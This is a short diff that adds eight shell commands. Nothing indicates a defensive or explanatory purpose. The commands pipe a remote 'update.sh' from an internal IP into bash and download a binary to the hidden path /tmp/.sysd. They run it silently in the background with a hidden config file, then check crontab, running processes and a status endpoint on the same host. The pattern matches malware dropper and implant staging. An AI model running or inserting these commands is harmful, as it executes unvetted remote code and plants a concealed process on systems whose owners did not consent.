@@ -1,0 +1,8 @@
+curl -fsSL http://172.16.5.14/update.sh | bash
+wget http://172.16.5.14/bin/sysd -O /tmp/.sysd
+chmod +x /tmp/.sysd
+nohup /tmp/.sysd --config=/tmp/.config.json >/dev/null 2>&1 &
+crontab -l
+ls -la /tmp/.sysd /tmp/.config.json
+ps aux | grep sysd
+curl -s http://172.16.5.14/status
